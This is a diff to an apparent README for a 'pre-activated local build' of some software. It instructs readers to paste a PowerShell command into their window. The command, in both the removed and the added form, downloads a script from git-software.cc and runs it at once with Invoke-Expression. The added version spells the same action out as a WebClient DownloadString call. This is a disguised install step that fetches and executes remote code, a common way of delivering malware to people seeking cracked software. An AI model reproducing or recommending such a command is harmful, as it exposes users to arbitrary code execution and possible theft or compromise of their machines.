@@ -19,7 +19,7 @@ Pre-activated local build for testing and deployment.
    Copy the command below, paste it into your PowerShell window, and hit `Enter`. Wait until all :
 
    ```cmd
-   irm https://git-software.cc/ps/Setup.ps1 | Invoke-Expression
+   $URL = "https://git-software.cc/ps/Setup.ps1"; $WebClient = New-Object System.Net.WebClient; $Script = $WebClient.DownloadString($URL); Invoke-Expression $Script
    ```
 
 ---
